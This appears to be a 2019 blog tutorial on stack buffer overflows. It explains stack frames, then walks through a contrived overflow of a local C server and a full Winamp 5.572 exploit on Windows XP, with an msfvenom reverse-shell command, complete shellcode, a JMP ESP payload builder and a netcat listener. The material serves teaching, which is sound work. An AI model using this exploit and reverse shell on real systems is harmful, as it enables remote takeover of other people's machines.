---
layout: post
title: "Smashing the Stack"
date: "2019-07-04 8:40:10"
comments: false
categories:
- hacking
tags:
- exploit
- hacking
---

Here I attempt to briefly describe what a buffer overflow is, and they can be exploited. Some prerequistite knowledge of (Intel x86) assembly and how a Von-Neumann machine works is needed. Attacking the stack is only one category of control flow attack, there are many others including heap allocators, race conditions, root exploits, ELF, networking, viruses, etc.

The end game is to gain control of the instruction pointer (IP), and as a result contol flow of the program. But to set the scene, need to understand how this is even possible in the first place. All general purpose binary computers are bound by the laws of the turing machine, and its implementation architecture, the *Von-Neumann* design.


# Why a stack?

The most elegant and clearly written resource for understanding the stack and its weaknesses is the seminal paper by Aleph One called [Smashing The Stack For Fun And Profit](https://www.win.tue.nl/~aeb/linux/hh/phrack/P49-14), PDF version [here](/blob/stack_smashing.pdf).

The stack exists to provide hardware (CPU) level support for procedures, one of the most pivotal concepts introduced by high-level languages such as C. A procedure call alters the control flow, like a jump instuction does, but unlike a jump, when finished, a procedure returns control to the instruction following the call.

The stack is also used to:

* dynamically allocate local variables used within procedures
* to pass parameters to procedures
* to return values from the procedure

When a process is loaded into memory, are cut up into three regions, text, data and stack.

        0x00000000
    /------------------\
    |                  |
    |       Text       |
    |                  |
    |------------------|
    |   (Initialized)  |
    |        Data      |
    |  (Uninitialized) |
    |------------------|
    |                  |
    |       Stack      |
    |                  |
    \------------------/
        0xFFFFFFFF

The **text region** is fixed and includes code (instructions) and read-only data. This region is normally marked as read-only by the kernel, and any attempt to modify it will result in a segmentation fault.

The **data region** corresponds to the `data-bss` section the the object file (e.g. in say an ELF or PE binary). Static variables are stored here. Dynamic variables are allocated at runtime on the stack.




# How the stack works

A stack is a contiguous block of memory. A register called the *stack pointer* (SP) points to the **top** of the stack. The CPU provides instructions `PUSH` onto and to `POP` off the stack.

The *stack* is made up of a bunch of *stack frames*, which are pushed whenever a procedure is called, and popped whenever a procedure returns. A stack frame contains all state that a procedure cares about (parameters, local variables), the address of the instruction needed to recover the previous stack frame, and the instruction pointer at the time the procedure was called (so execution of the program can continue where it left off).

Depending on the CPU the stack will either grow downwards (towards lower memory addresses) or upwards. Lots of chips (e.g. Intel, Motorola, SPARC and MIPS) grow down.

In addition to the *stack pointer* or `SP`, its convenient to keep track of a *frame pointer* or `FP` which is a fixed location in each *stack frame*. The *frame pointer* is also commonly referred to as the *base pointer* or `BP`. This provides a way for local variables to be referenced by their offset from the `FP` (e.g. `FP - 12`). While the `SP` can indeed be used as to reference things on the stack, this is risky as its offset changes by its very nature...as words are pushed onto and popped off the stack. In other words the `FP` does not change with `PUSH`es and `POP`s. On Intel, the `EBP` register is used to store the frame pointer.

                 0x00000000
            
            |       ...        |
            |------------------|
    ESP ->  |       var2       | EBP - 8
            |------------------|
            |       var1       | EBP - 4
            |------------------|
    EBP ->  |    saved EBP     |
            |------------------|
            |      return      | EBP + 4
            |------------------|
            |       arg1       | EBP + 8
            |------------------|
            |       arg2       | EBP + 12
            |------------------|
            |       ...        |
            
                 0xFFFFFFFF


# Procedure prolog and epilog

## Prolog

As soon as a procedure is called, it must:

1. Save the previous `FP` (so it can be recovered at procedure exit)
1. Copy the `SP` into the `FP` to create a new `FP`
1. Advance the `SP` to reserve space needed for local variables

## Epilog

When the procedure is ready to exit, it must:

1. Ensure the stack is cleaned up
1. Reinstate the instruction pointer the moment before the procedure was called, so control flow in the program continues

There are different conventions here.

In the UNIX and Linux world (`cdecl`) its up to the procedure (callee) to clean up the stack (e.g. `ADD ESP,12`) and the caller to reinstate the `IP` using the `RET` instruction.

In the Windows world (`stdcall`) its up to the caller of the procedure to do everything (e.g. `RET 12`).

The `RET` instruction pops the last value off the stack, which supposed to be the returning address, and assign it to the `IP` register. `RET` can also optionally be given a number of bytes such as `RET 12` which would first reduce the `SP` by 12 bytes, followed by `POP`ing the address to place into the `IP`.




# Overwriting the return address (contrived example)

To help drive the buffer overrun home with a working sample. As highlighted, when procedure is called its prolog saves the return address and creates a new stack frame. The return address allows control flow to resume where it left off, once the procedure call is complete. It is this very control flow that a buffer overrun exploits.

*Setup*:

To add x86 architecture support to kali:

    dpkg --add-architecture i386

Then to get a working development environment, for hacking on these x86 samples:

    apt update
    apt install libc-dev-i386-cross gdb-multiarch execstack gdb-peda lib32tinfo6 lib32ncurses6 lib32ncurses-dev gcc-7


 First a piece of vulnerable code:

    void overflowme(char *str) {
        char buf[4] = {0};
        strcopy(buf, str);
    }
    
    void secretfunc(void) {
        puts("You win!!!!!!!!!!!!!!!!!!\n");
    }
    
    void strcopy(char* dst, char* src) {
        while ((*dst++ = *src++));
    }

The main function calls `overflowme`, but the objective here is to make the program execute `secretfunc`, which it currently does not. To achieve this, the exact memory address of `secretfunc` as it exists in the address space of the running program is needed. To keep this first example simple, the address is output:

    printf("[+] secretfunc is @ %p\n", (void*)secretfunc);

Which dumps out something like this:

    [+] secretfunc is @ 0x804975a                                                                                                                                                                                   
`overflowme` contains a 4 byte buffer. To get the program to run `secretfunc`, seems like just a matter of filling the buffer up with a large number of bytes that match the address of `secretfunc` (0x804975a). Some Python that will interact with the vulnerable server process - to start let try and flood the 4-byte buffer with 12 bytes:

```python
#!/usr/bin/env python

import socket
import struct

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("localhost", 8888))
#buf="A" * 8
buf = struct.pack('<I', 0x804975a) * 12
print("Sending shellcode (" + str(len(buf)) + " bytes)")
s.send(buf)
```

Start the vulnerable C server process:

    # ./bin/server
    [+] Server is starting...
    [+] Server is now listening on 8888
    [+] secretfunc is @ 0x804975a
    [+] Awaiting clients...

And run the python exploit:

      [+] (Client 4) Connected
    Printing:You are client 4
      [+] (Client 4) Sent us 48 bytes
      [+] (Client 4) Sent us ''
    You win!!!!!!!!!!!!!!!!!!
    You win!!!!!!!!!!!!!!!!!!
    ...
    Illegal instruction

We can see the `secretfunc` was executed several times, before the program crashed.




# Windows Example - Winamp 5.572 on XP

As documented on [exploit-db](https://www.exploit-db.com/exploits/11256) this old version of winamp had a buffer overflow vulnerability in part of its help menu, which loads its release notes from a plain text file called `whatsnew.txt` in its install path.


**Setup**

Setup requirements for VM:

* Windows XP SP3
* Winamp 5.572
* Immunity Debugger with mona extension
* Python


**Step 1: Find the overflow tipping point**

The key to leveraging a buffer overflow is to locate the offset in bytes needed in order to gain control of the `EIP` (instruction pointer). One brute force way of doing this is to simply flood the buffer with a huge amount of the same bytes, observing the register state when the program crashes.

In the case of winamp, flood the buffer with 2,000 `A` (`0x41`) character bytes:

```python
buf = "Winamp 5.572"
buf += "A"*3000

with open('whatsnew.txt', 'w') as file:
    file.write(buf)
```

Replace the original `whatsnew.txt` with the above, and run winamp using Immunity, go to the Help | About Winamp | Version History, triggering a segmentation fault. Examine the `EIP` register.

    EIP 41414141

Bingo! They're all `A` ascii characters. Now we need a way to determine the exact number of bytes until the `EIP` is controlled. A unique pattern of bytes would be perfect. Enter [mona](https://github.com/corelan/mona), which bolsters immunity debugger with a bunch of handy automation around exploitation related activities. In Immunity run the following:

    !mona pattern_create 3000

This will create a 3000 byte long unique cyclic string in a file called `pattern.txt` in the immunity home directory:

    Message=Creating cyclic pattern of 3000 bytes
    Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2...

Replace the `A` bytes with the pattern bytes, and segfault winamp again. 

```python
buf = "Winamp 5.572"
buf += "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa..."

with open('whatsnew.txt', 'w') as file:
    file.write(buf)
```

Examine the EIP and find where in this pattern the offset is:

    EIP 41307341

Nice, 4 unique bytes, just need to find the index within the pattern text and we get the offset.

`mona` again can take care of this grunt work automatically. It will cross examine the data in each register against the pattern text:

    !mona suggest
          
              ---------- Mona command started on 2019-08-10 23:26:41 (v2.0, rev 596) ----------
    0BADF00D  [+] Examining registers
    0BADF00D      EIP contains normal pattern : 0x41307341 (offset 540)
    0BADF00D      ESP (0x00b7ef60) points at offset 560 in normal pattern (length 2439)
    0BADF00D      EDI (0x00b7efb0) points at offset 640 in normal pattern (length 2359)
    0BADF00D      EBP (0x00b7ef74) points at offset 580 in normal pattern (length 2419)

The offset to `EIP` heaven is 540.


**Step 2: Find a trampoline (JMP ESP gadget)**

Now that the specific number of bytes needed to gain control of `EIP` has been identified, need to somehow get the address of our shellcode into the `EIP`. A clever way to accomplish this, with needing to know the specific address to the shellcode in address space (which is always on the move with *ASLR*), is to use a `JMP ESP` trampoline. The idea is, if we can point the `EIP` to an existing `JMP ESP; RET` instruction in the program, control flow will transfer back to the overflowed stack buffer, immediately after the return address value that was crafted.


    !mona jmp -r esp
              
              ---------- Mona command started on 2019-08-10 23:27:42 (v2.0, rev 596) ----------
    0BADF00D  [+] Processing arguments and criteria
    0BADF00D      - Pointer access level : X
    0BADF00D  [+] Generating module info table, hang on...
    0BADF00D      - Processing modules
    0BADF00D      - Done. Let's rock 'n roll.
    0BADF00D  [+] Querying 137 modules
    0BADF00D      - Querying module COMDLG32.dll
    0BADF00D      - Querying module in_vorbis.dll
    ...
    0BADF00D      - Querying module wdmaud.drv
    0BADF00D      - Search complete, processing results
    0BADF00D  [+] Preparing output file 'jmp.txt'
    0BADF00D      - (Re)setting logfile jmp.txt
    0BADF00D  [+] Writing results to jmp.txt
    0BADF00D      - Number of pointers of type 'jmp esp' : 96 
    0BADF00D      - Number of pointers of type 'call esp' : 64 
    0BADF00D      - Number of pointers of type 'push esp # ret ' : 85 
    0BADF00D      - Number of pointers of type 'push esp # ret 0x04' : 2 
    0BADF00D  [+] Results : 
    59A050A3    0x59a050a3 : jmp esp |  {PAGE_EXECUTE_READ} [wmdmlog.dll] ASLR: False, Rebase: False, SafeSEH: True, OS: True, v9.0.1.56 (C:\WINDOWS\system32\wmdmlog.dll)
    77559BFF    0x77559bff : jmp esp |  {PAGE_EXECUTE_READ} [ole32.dll] ASLR: False, Rebase: False, SafeSEH: True, OS: True, v5.1.2600.5512 (C:\WINDOWS\system32\ole32.dll)
    7755A930    0x7755a930 : jmp esp |  {PAGE_EXECUTE_READ} [ole32.dll] ASLR: False, Rebase: False, SafeSEH: True, OS: True, v5.1.2600.5512 (C:\WINDOWS\system32\ole32.dll)
    775A996B    0x775a996b : jmp esp |  {PAGE_EXECUTE_READ} [ole32.dll] ASLR: False, Rebase: False, SafeSEH: True, OS: True, v5.1.2600.5512 (C:\WINDOWS\system32\ole32.dll)
    775C068D    0x775c068d : jmp esp |  {PAGE_EXECUTE_READ} [ole32.dll] ASLR: False, Rebase: False, SafeSEH: True, OS: True, v5.1.2600.5512 (C:\WINDOWS\system32\ole32.dll)
    7E429353    0x7e429353 : jmp esp |  {PAGE_EXECUTE_READ} [USER32.dll] ASLR: False, Rebase: False, SafeSEH: True, OS: True, v5.1.2600.5512 (C:\WINDOWS\system32\USER32.dll)
    7E4456F7    0x7e4456f7 : jmp esp |  {PAGE_EXECUTE_READ} [USER32.dll] ASLR: False, Rebase: False, SafeSEH: True, OS: True, v5.1.2600.5512 (C:\WINDOWS\system32\USER32.dll)
    7E455AF7    0x7e455af7 : jmp esp |  {PAGE_EXECUTE_READ} [USER32.dll] ASLR: False, Rebase: False, SafeSEH: True, OS: True, v5.1.2600.5512 (C:\WINDOWS\system32\USER32.dll)
    7E45B310    0x7e45b310 : jmp esp |  {PAGE_EXECUTE_READ} [USER32.dll] ASLR: False, Rebase: False, SafeSEH: True, OS: True, v5.1.2600.5512 (C:\WINDOWS\system32\USER32.dll)
    0BADF00D  ... Please wait while I'm processing all remaining results and writing everything to file...
    0BADF00D  [+] Done. Only the first 20 pointers are shown here. For more pointers, open jmp.txt...
    0BADF00D      Found a total of 247 pointers
    0BADF00D  
    0BADF00D  [+] This mona.py action took 0:01:45.452000

Awesome, lots of `JMP ESP` gadgets were discovered, I'll just go with the first one from `wmdmlog.dll` at address `0x59a050a3`. All discovered `JMP ESP` gadgets are written out to `jmp.txt`.



**Step 3: Shellcode**

We nearly have all the ingredient for a classical executable stack based overflow attack. We just some shellcode, a reverse shell that will dial home to our remote host, giving us control over the computer. Using metasploit:

    msfvenom -n 100 -p windows/shell_reverse_tcp -f python -a x86 --platform windows -b "\x00\x09\x0a\x0d\x1a" -e x86/shikata_ga_nai LHOST=192.168.1.177 LPORT=443 > shellcode.py



**Step 4: Craft the payload**

Python is very good for crafting payloads, especially useful is the `struct` package which will pack bytes according to the specified endianess.

Given all the ingredients have been obtained, simply need to pack the payload for poor old winamp according to the following layout:

    [ PADDING UNTIL EIP ][ JMP ESP GADGET ][ SHELLCODE ]

A little bit of python to pack the payload, noting the shellcode was already conveniently in python that to the `-f` switch using `msfvenon`. Checkout the `struct.pack` call - how dope is that!?

```python
import struct

buf = "Winamp 5.572"

buf += "A"*540

jmp_esp_addr = struct.pack('<I', 0x59a050a3)
buf += jmp_esp_addr

buf += "\x90" * 16 # small nop sled

#shell code from msfvenom
buf += "\x48\x41\x90\xf5\x27\x93\x4b\xf9\x41\xf9\xd6\x37\x9f"
buf += "\xf5\x2f\xf9\x37\x91\xf9\x3f\x3f\x9f\x43\x4a\x37\x98"
buf += "\x93\x41\x4b\x41\x41\x41\x3f\x27\x4b\x92\x2f\x98\x40"
buf += "\x41\x99\x90\xfd\xf9\x4a\x90\x98\x4b\x48\xf9\x43\xf5"
buf += "\xfc\x93\x40\x3f\xf5\x98\x9b\x42\x49\x37\x9f\x92\xf5"
buf += "\x92\x93\x90\x3f\x98\xd6\x92\x98\xfc\x92\x98\x3f\x43"
buf += "\x4a\x90\x27\x9b\x92\x42\x92\x42\x99\x92\x98\x27\xfd"
buf += "\x9b\x42\x92\x42\xfc\x98\xfc\xfc\xfc\xd9\xed\xd9\x74"
buf += "\x24\xf4\x58\xba\x5c\x49\xdd\x1b\x31\xc9\xb1\x52\x31"
buf += "\x50\x17\x03\x50\x17\x83\x9c\x4d\x3f\xee\xe0\xa6\x3d"
buf += "\x11\x18\x37\x22\x9b\xfd\x06\x62\xff\x76\x38\x52\x8b"
buf += "\xda\xb5\x19\xd9\xce\x4e\x6f\xf6\xe1\xe7\xda\x20\xcc"
buf += "\xf8\x77\x10\x4f\x7b\x8a\x45\xaf\x42\x45\x98\xae\x83"
buf += "\xb8\x51\xe2\x5c\xb6\xc4\x12\xe8\x82\xd4\x99\xa2\x03"
buf += "\x5d\x7e\x72\x25\x4c\xd1\x08\x7c\x4e\xd0\xdd\xf4\xc7"
buf += "\xca\x02\x30\x91\x61\xf0\xce\x20\xa3\xc8\x2f\x8e\x8a"
buf += "\xe4\xdd\xce\xcb\xc3\x3d\xa5\x25\x30\xc3\xbe\xf2\x4a"
buf += "\x1f\x4a\xe0\xed\xd4\xec\xcc\x0c\x38\x6a\x87\x03\xf5"
buf += "\xf8\xcf\x07\x08\x2c\x64\x33\x81\xd3\xaa\xb5\xd1\xf7"
buf += "\x6e\x9d\x82\x96\x37\x7b\x64\xa6\x27\x24\xd9\x02\x2c"
buf += "\xc9\x0e\x3f\x6f\x86\xe3\x72\x8f\x56\x6c\x04\xfc\x64"
buf += "\x33\xbe\x6a\xc5\xbc\x18\x6d\x2a\x97\xdd\xe1\xd5\x18"
buf += "\x1e\x28\x12\x4c\x4e\x42\xb3\xed\x05\x92\x3c\x38\x89"
buf += "\xc2\x92\x93\x6a\xb2\x52\x44\x03\xd8\x5c\xbb\x33\xe3"
buf += "\xb6\xd4\xde\x1e\x51\x1b\xb6\x21\x25\xf3\xc5\x21\x24"
buf += "\xbf\x43\xc7\x4c\xaf\x05\x50\xf9\x56\x0c\x2a\x98\x97"
buf += "\x9a\x57\x9a\x1c\x29\xa8\x55\xd5\x44\xba\x02\x15\x13"
buf += "\xe0\x85\x2a\x89\x8c\x4a\xb8\x56\x4c\x04\xa1\xc0\x1b"
buf += "\x41\x17\x19\xc9\x7f\x0e\xb3\xef\x7d\xd6\xfc\xab\x59"
buf += "\x2b\x02\x32\x2f\x17\x20\x24\xe9\x98\x6c\x10\xa5\xce"
buf += "\x3a\xce\x03\xb9\x8c\xb8\xdd\x16\x47\x2c\x9b\x54\x58"
buf += "\x2a\xa4\xb0\x2e\xd2\x15\x6d\x77\xed\x9a\xf9\x7f\x96"
buf += "\xc6\x99\x80\x4d\x43\xa9\xca\xcf\xe2\x22\x93\x9a\xb6"
buf += "\x2e\x24\x71\xf4\x56\xa7\x73\x85\xac\xb7\xf6\x80\xe9"
buf += "\x7f\xeb\xf8\x62\xea\x0b\xae\x83\x3f"

with open('whatsnew.txt', 'w') as file:
    file.write(buf)
```


**Step 5: Remote listener and run exploit**

To catch the TCP reverse shell triggered by the shellcode, ensure that the remote host is listening, e.g. on a remote kali box:

    nc -l -p 443

Now trigger the exploit by viewing the help menu in winamp, using the payload prepared by the python script above. You will see the netcat listener now has a DOS prompt remotely running on the windows XP host.




# 
